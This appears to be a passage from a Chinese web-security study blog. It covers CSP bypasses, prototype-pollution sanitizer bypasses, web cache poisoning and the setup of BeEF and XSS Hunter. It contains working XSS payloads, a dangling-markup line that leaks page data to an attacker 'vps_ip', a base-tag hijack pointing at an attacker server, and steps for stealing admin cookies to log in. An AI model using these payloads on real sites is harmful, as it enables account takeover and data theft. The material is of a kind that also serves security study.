标签上方，且其中没有其他标签</li>\n<li>XSS 页面的 CSP script-src 只采用了 nonce 方式</li>\n</ul>\n<p>需要将后面的没用内容注释，或者加到另一个属性中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)//</span><br><span class=\"line\">x http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1) 123=</span><br></pre></td></tr></table></figure>\n<p>8. 不完整资源标签获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; img-src *;&quot;&gt;</span><br><span class=\"line\">&lt;?php echo $_GET[&#x27;xss&#x27;]?&gt;</span><br><span class=\"line\">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class=\"line\">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>\n<p>可以使用外联图片的 CSP，将 src 中内容延伸至下一个 &quot;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;img src=&quot;//vps_ip?a= </span><br></pre></td></tr></table></figure>\n<p>baseuri 绕过</p>\n<p>当网站设置了 script nonce， 在无法猜测 nonce 值的情况下，且 base-uri 没有被设置。</p>\n<p>那么可以使用 <code>&lt;base&gt;</code>  标签将文档的基础 URI 修改为自己的服务器地址。</p>\n<p>如下，需要本来文档就存在相对地址加载 js 的情况。最后 只要在自己服务器放上一个 123.js 就行了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;base href=&quot;//xx.xx.xxx.xx:8888&quot;&gt;</span><br><span class=\"line\">&lt;script nonce=&#x27;test&#x27; src=&quot;/123.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>302 跳转</p>\n<p>网站都会带有一个 302 跳转功能的页面，用它来导向到本站的资源或者是外部的链接</p>\n<p>如果我们的 script-src 设置为某个目录，通过这个目录下的 302 跳转，是可以绕过 csp 读取到另一个目录下的脚本的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a/csp.php</span><br><span class=\"line\">&lt;!-- csp.php --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"> header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src http://127.0.0.1/a/&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> &lt;html&gt;</span><br><span class=\"line\"> &lt;head&gt;</span><br><span class=\"line\"> &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">     csp header test </span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\"> &lt;/html&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">a/redirect.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;Location: &quot; . $_GET[url]);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">b/text.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\"> &lt;title&gt;1&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">123</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>csp 限制了 <code>/a/</code>  目录，而我们的目标脚本在 <code>/b/</code>  目录下则如果这时候请求 <code>redirect</code>  页面去访问 <code>/b/</code>  下的脚本是可以通过 csp 的检查的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/a/redirect.php?url=/b/test.php</span><br></pre></td></tr></table></figure>\n<p>但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下 (<a href=\"http://example.com\">example.com</a>)，也就是不可能通过 302 跳转去加载一个其他域下的脚本的，比如通过</p>\n<p><code>a.com</code>  的 302 跳转去加载 <code>b.com</code>  下的脚本是不可以</p>\n<p>在实际环境中，比如某个站调用某个 cdn，或者类似于 <code>script-src example.com/scripts/ google.com/recaptcha/</code> ， <code>google.com/script/*</code>  下有个 <code>evil.js</code> ，然后刚好站内有个重定向，漏洞条件就已经成立了。</p>\n<ul>\n<li>在 script-src 允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录</li>\n<li>在 script-src 允许的域下，存在某个任意文件的上传点（任意目录）</li>\n<li>有特别的方式可以跨域发送请求，或者有站内域可以接受请求</li>\n</ul>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE1ODkyOC5odG1s\">CSP 浅析与绕过 - SecPulse.COM | 安全脉搏</span></p>\n</blockquote>\n<p>CRLF 文件头</p>\n<p>当一个页面存在 CRLF 漏洞时，且我们的可控点在 CSP 上方，就可以通过注入回车换行，将 CSP 挤到 HTTP 返回体中，这样就绕过了 CSP</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzk0ODM2OC5odG1s\">我的 CSP 绕过思路及总结 | CN-SEC 中文网</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMTU3ODItOWQ2MWU1Y2EtYjViMy00ODE4LTg1OGQtMjJkODA4NWY0YzVmLm1k\">📎通过浏览器缓存来 bypass CSP script nonce.md</span></p>\n<p>条件</p>\n<p>1. 开启缓存，nonce 保存在本地  <code>header( 'cache-Control: max-age=99999999 ' );</code></p>\n<p>不能对页面发起请求，因为发起请求之后，后台就会刷新页面并刷新 nonce 的字符串</p>\n<p>2. 有 document.write ，截断 href，只会保存 #前面的内容</p>\n<p>3.textarea nonce，textarea 中只能容纳文本</p>\n<p>4.ajax 无刷新</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;document.write(&#x27;URL &#x27; + unescape(location.href))&lt;/script&gt;&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;console.log(&#x27;another nonced script&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>然后我们需要利用 iframe 引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个 <code>&lt;textarea&gt;</code>  标签来吃掉后面的 script 标签，这样就可以获取内容。</p>\n<p>然后我们需要一个页面去获取 nonce 字符串，为了反复获得，这里需要开启 session。</p>\n<p>唯一的问题就是在 nonce script 上，由于 csp 开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171141247.png\" alt=\"image-20221013171141247\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171233853.png\" alt=\"image-20221013171233853\"></p>\n<h2 id=\"原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNjM1MTI4NTYtNjJiY2JkYjAtZDI0ZS00NTc4LTlhZWMtOGM0ODlkN2U3OTQ1Lm1k\">📎原型污染 - 并绕过客户端 HTML sanitizer.md</span></p>\n<p>原型链特定于 JavaScript，它源于 JavaScript 继承模型，称为<strong>基于原型的继承</strong>，JavaScript 中的每个对象都有一个原型（也可以是 <code>null</code> ）。如果我们不指定它，默认情况下对象的原型是 <code>Object.prototype</code> ，通过 object.prototype 检查对象的属性。</p>\n<p>当我们尝试访问对象的属性时，JS 引擎首先检查对象本身是否包含该属性。如果是，则将其退回。否则，JS 会检查原型是否具有该属性。如果没有，JS 会检查原型的原型…… 以此类推，直到原型为 <code>null</code> . 它被称为原型链。</p>\n<p>如果我们能以某种方式<strong>污染 Object.prototype</strong>（即用新属性对其进行扩展），那么所有 JS 对象都会具有这些属性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;);&#125;</span><br></pre></td></tr></table></figure>\n<p>当前 user 没有 admin 的属性，但如果我们污染了 <code>Object.prototype</code>  和定义名为的属性 <code>admin</code> ，那么 <code>console.log</code>  将执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.admin = true;const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;); // this will execute&#125;</span><br></pre></td></tr></table></figure>\n<p>此漏洞的入口点通常是合并操作（即将一个对象的所有属性复制到另一个对象）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const obj1 = &#123; a: 1, b: 2 &#125;;</span><br><span class=\"line\">recursiveMerge(obj1, obj2); </span><br><span class=\"line\">递归合并的基本流程是：</span><br><span class=\"line\">1. 遍历 obj2 的所有属性并检查它们是否存在于`obj1`.</span><br><span class=\"line\">2. 如果存在属性，则对该属性执行合并操作。</span><br><span class=\"line\">3. 如果属性不存在，则将其从 复制`obj2`到`obj1`。</span><br></pre></td></tr></table></figure>\n<p>如果用户对要合并的对象有任何控制权，那么通常其中一个对象来自 <code>JSON.parse</code> . And <code>JSON.parse</code>  有点特别，因为它被视为 <code>__proto__</code> “普通” 属性，即没有作为原型访问器的特殊含义</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1024x219.png\" alt=\"img\"></p>\n<p>访问 <code>obj1.__proto__</code> 返回 <code>Object.prototype</code> （ <code>__proto__</code> 返回原型的特殊属性也是如此），同时 <code>obj2.__proto__</code> 包含 JSON 中给出的值，即： <code>123</code> . 这证明了 <code>__proto__</code> 属性的处理方式与 <code>JSON.parse</code>  普通 JavaScript 不同。</p>\n<p>所以现在想象一个 <code>recursiveMerge</code>  合并两个对象的函数：</p>\n<ul>\n<li><code>obj1=&#123;&#125;</code></li>\n<li><code>obj2=JSON.parse('&#123;&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;')</code></li>\n</ul>\n<ol>\n<li>遍历 <code>obj2</code> . 唯一的属性是 <code>__proto__</code> 。</li>\n<li>检查是否 <code>obj1.__proto__</code> 存在。确实如此。</li>\n<li>遍历 <code>obj2.__proto__</code> . 唯一的属性是 <code>x</code> 。</li>\n<li>赋值： <code>obj1.__proto__.x = obj2.__proto__.x</code> 。因为 <code>obj1.__proto__</code> 指向 <code>Object.prototype</code> ，则原型被污染。</li>\n</ol>\n<p>在许多流行的 JS 库中都发现了这种类型的错误，包括<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1MT0RBU0gtNDUwMjAy\"> lodash</span> 或<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL2Jsb2cvYWZ0ZXItdGhyZWUteWVhcnMtb2Ytc2lsZW5jZS1hLW5ldy1qcXVlcnktcHJvdG90eXBlLXBvbGx1dGlvbi12dWxuZXJhYmlsaXR5LWVtZXJnZXMtb25jZS1hZ2Fpbi8=\"> jQuery</span>。</p>\n<p>所有公开的利用原型污染的例子都集中在 NodeJS 上，其目标是实现远程代码执行。</p>\n<h3 id=\"通过原型链污染bypass-html-sanitizer\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-html-sanitizer\">#</a> 通过原型链污染 bypass HTML sanitizer</h3>\n<p>想象一下，我们有一个只允许 <code>&lt;b&gt;</code>  和 <code>&lt;h1&gt;</code>  标签的 sanitizer。如果我们用以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; &lt;i&gt;HTML&lt;/i&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>它应该将其清理为以下形式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; HTML</span><br></pre></td></tr></table></figure>\n<p>HTML sanitizer 需要维护允许的元素属性和元素列表。基本上，库通常采用以下两种方式之一来存储列表：</p>\n<p>该库可能有一个包含允许元素列表的数组，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = [&quot;h1&quot;, &quot;i&quot;, &quot;b&quot;, &quot;div&quot;]</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，他们只需调用 <code>ALLOWED_ELEMENTS.includes(element)</code> . 这种方法可以避免原型污染，因为我们不能扩展数组；也就是说，我们不能污染 <code>length</code>  属性，也不能污染已经存在的索引。即使使用 <code> Object.prototype.length = 10;Object.prototype[0] = 'test';</code> , 然后 <code>ALLOWED_ELEMENTS.length</code>  仍然返回 <code>4</code>  并且 <code>ALLOWED_ELEMENTS[0]</code>  仍然是 <code>&quot;h1&quot;</code> 。</p>\n<p>另一种解决方案是存储一个包含允许元素的对象，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = &#123; &quot;h1&quot;: true, &quot;i&quot;: true, &quot;b&quot;: true, &quot;div&quot; :true&#125;</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，库可能会检查 <code>ALLOWED_ELEMENTS[element]</code> . 这种方法很容易通过原型污染加以利用；因为如果我们通过以下方式污染原型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.SCRIPT = true;</span><br></pre></td></tr></table></figure>\n<p>然后 <code>ALLOWED_ELEMENTS[&quot;SCRIPT&quot;]</code>  返回 <code>true</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427192220087.png\" alt=\"image-20220427192220087\"></p>\n<h3 id=\"通过原型链污染bypass-dompurify\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-dompurify\">#</a> 通过原型链污染 bypass DOMPurify</h3>\n<p>与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png\" alt=\"img\"></p>\n<p>DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* Set configuration parameters */</span><br><span class=\"line\">ALLOWED_TAGS = &#x27;ALLOWED_TAGS&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;</span><br><span class=\"line\">ALLOWED_ATTR = &#x27;ALLOWED_ATTR&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;</span><br></pre></td></tr></table></figure>\n<p>在 JavaScript 中 <code>in</code> ，运算符遍历原型链。因此 <code>'ALLOWED_ATTR' in cfg</code> ，如果此属性存在于 <code>Object.prototype</code> .</p>\n<p>DOMPurify 默认允许使用 <code>&lt;img&gt;</code>  标签，因此该漏洞利用只需要 <code>ALLOWED_ATTR</code>  使用 <code>onerror</code>  和进行污染 <code>src</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png\" alt=\"img\"></p>\n<p>其他通过原型链污染 bypass xss 过滤框架不在叙述，可以到参考文献中查看</p>\n<h3 id=\"ctf案例原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#ctf案例原型链污染\">#</a> CTF 案例：原型链污染</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p>难度太大，就不班门弄斧了…</p>\n<h2 id=\"缓存投毒\"><a class=\"markdownIt-Anchor\" href=\"#缓存投毒\">#</a> 缓存投毒</h2>\n<p>Web 缓存位于用户和应用程序服务器之间，用于保存和提供某些响应的副本。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015170751343.png\" alt=\"image-20221015170751343\"></p>\n<p>缓存技术旨在通过减少延迟来加速页面加载，还可以减少应用程序服务器上的负载。可以使用 Varnish 或 CDN 设置网站的缓存</p>\n<p>每当缓存服务收到对资源的请求时，它需要确定它是否已经保存了这个指定资源的副本，并且可以使用该副本进行响应，或者是否需要将请求转发给应用程序服务器。</p>\n<p>确定两个请求是否正在尝试加载相同的资源可能是很棘手的问题；对请求进行逐字节匹配的做法是完全无效的，因为 HTTP 请求充满了无关紧要的数据，例如请求头中的 User-Agent 字段</p>\n<p>缓存使用缓存键的概念解决了这个问题 – 使用一些特定要素用于完全标识所请求的资源，但可能导致缓存系统错误认为两个缓存键相同但其他参数不同的请求是等效的，将返回错误的数据。</p>\n<p>Web 缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015171200570.png\" alt=\"image-20221015171200570\"></p>\n<p>非缓存键出现在错误的地方，可以来自于 HTTP 请求头，HTTP 响应，路由，DOM 等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427202534867.png\" alt=\"image-20220427202534867\"></p>\n<p>识别缓存键可以使用如下插件～：burpsuite param miner</p>\n<p>详细可以看这个文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">https://www.anquanke.com/post/id/156356</span></p>\n<p>对应的 burpsuite 也有相应的靶场</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmc=\">Web cache poisoning | Web Security Academy (portswigger.net)</span></p>\n<p>防御：</p>\n<p>针对缓存投毒的最强大防御办法就是禁用缓存。</p>\n<p>如果您对确定哪些内容是 “静态” 的足够确认，那么只对纯静态的响应进行缓存也是有效的。</p>\n<p>同样，避免从请求头和 cookie 中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的请求头。</p>\n<p>一旦在应用程序中识别出非缓存键的输入，理想的解决方案就是彻底禁用它们。</p>\n<p>最后，无论您的应用程序是否使用缓存技术，你的某些客户端可能在其末端都存在缓存，因此不应忽视 HTTP 请求头中的 XSS 等客户端漏洞。</p>\n<h2 id=\"奇技淫巧\"><a class=\"markdownIt-Anchor\" href=\"#奇技淫巧\">#</a> 奇技淫巧</h2>\n<h3 id=\"1通过特殊字符绕过或缩短playload和src长度\"><a class=\"markdownIt-Anchor\" href=\"#1通过特殊字符绕过或缩短playload和src长度\">#</a> 1. 通过特殊字符绕过或缩短 playload 和 src 长度</h3>\n<p>利用浏览器对 Unicode 兼容性构造 script 中短 src</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=//℡℠.㎺&gt;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS10ZWxzbS1kcTFoMDNiMzR3MHJmNjMzY2hobmR0NGZla2EucHc=\">浏览器可以解析为 telsm.pw</span>，但 length 只有 4 个字符</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=\">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s\">https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html</span></p>\n<p><code>ſ</code></p>\n<p><code>ß</code></p>\n<p><code>TEL</code></p>\n<p><code>SR</code></p>\n<p><code>PW</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png\" alt=\"img\"></p>\n<p>利用浏览器对 UNiocode 支持</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png\" alt=\"img\"></p>\n<h3 id=\"11-案例emersion-of-xss-with-20-characters-limitation\"><a class=\"markdownIt-Anchor\" href=\"#11-案例emersion-of-xss-with-20-characters-limitation\">#</a> 1.1 案例：emersion of XSS with 20 characters limitation</h3>\n<h3 id=\"1xss-platform\"><a class=\"markdownIt-Anchor\" href=\"#1xss-platform\">#</a> 1.Xss platform</h3>\n<h3 id=\"11beef-xss\"><a class=\"markdownIt-Anchor\" href=\"#11beef-xss\">#</a> 1.1beef-xss</h3>\n<p>安装： <code>apt-get install beef-xss</code></p>\n<p>注意事项：</p>\n<p>几种常见的安装报错：</p>\n<p>1. 更新 apt 源</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png\" alt=\"image-20220910205931724\"></p>\n<p>解决方法： <code>apt-get update </code>   <code>sudo apt-get upgrade</code></p>\n<p>2. 缺省依赖</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png\" alt=\"image-20220910210020518\"></p>\n<p>解决方法: <code>apt-get install libglib2.0-dev </code></p>\n<p>安装完之后在进行 <code>apt-get install beef-xss</code></p>\n<p>beef 默认路径： <code>http://127.0.0.1:3000/ui/panel</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png\" alt=\"image-20220910210358884\"></p>\n<p>使用 pkav 测试：</p>\n<p>使用系统提供的 payload</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png\" alt=\"image-20220910233217661\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png\" alt=\"image-20220910211111241\"></p>\n<p>此时再去 beef panel 查看</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png\" alt=\"image-20220910211138801\"></p>\n<p>说明此时已经上线，可以在 command 中找到命令执行：</p>\n<p>说明：</p>\n<ul>\n<li>绿色模块：表示模块适用当前用户，并且执行结果对用户不可见</li>\n<li>红色模块：表示模块不适用当前用户，有些红色模块也可以执行</li>\n<li>橙色模块：模块可用，但结果对用户可见</li>\n<li>灰色模块：模块为在目标浏览器上测试过</li>\n</ul>\n<p>最重要的是可以看到 cookies，如果对方是管理员登录，那么我们便可以使用管理员 cookie 进行登录</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png\" alt=\"image-20220910211534847\"></p>\n<h3 id=\"2xss-hunter\"><a class=\"markdownIt-Anchor\" href=\"#2xss-hunter\">#</a> 2.XSS-hunter</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3NodW50ZXIuY29tLw==\">https://xsshunter.com/</span></p>\n<p>1. 进行注册</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png\" alt=\"image-20220910232621209\"></p>\n<p>2. 注册完后系统会自动登录，在 XSS fires 页面，如果有已经上线的主机会在此显示，payloads 页面提供了一些 xsspayload</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png\" alt=\"image-20220910232730320\"></p>\n<p>3. 如果成功上线，会显示如下界面，full report 里面会有后台地址和 cookies</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png\" alt=\"image-20220910233046239\"></p>\n<h3 id=\"21-在centos上安装beef-xss\"><a class=\"markdownIt-Anchor\" href=\"#21-在centos上安装beef-xss\">#</a> 2.1 在 centos 上安装 beef-xss</h3>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY29tZG9kby9wLzU1MDY5OTYuaHRtbA==\">CentOS 安装 beEF 做 XSS 平台 - 海鸥博客 - 博客园 (cnblogs.com)</span></p>\n<p>但有些需要注意的点</p>\n<p>1. 上文中的启动 rvm 不一定是在 etc 下，是在你自己的安装目录下，启动完后使用 rvm 输出版本测试是否成功</p>\n<p>我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改 rvm 版本，是你安装得版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.rvm/archives</span><br><span class=\"line\">tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have</span><br></pre></td></tr></table></figure>\n<p>这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.rvm/archives/rvm-1.26.11/scripts/rvm</span><br></pre></td></tr></table></figure>\n<p>然后 rvm 命令就可以正常运行了</p>\n<p>2. 安装 ruby 时报错没有足够空间：找到安装 rvm 的目录的 /rvm/archives/rvm/scripts/functions/utility 文件，</p>\n<p>搜索 “df” 行，您将找到此代码将：</p>\n<p><code> __free_space=&quot;$( \\command \\df &quot;$1&quot; | __rvm_awk 'BEGIN&#123;x=4&#125; /Free/&#123;x=3&#125; $3==&quot;Avail&quot;&#123;x=3&#125; END&#123;print $x&#125;' )&quot;</code></p>\n<p>改为</p>\n<p><code>__free_space=&quot;999999&quot;</code></p>\n<p>同时为了防止 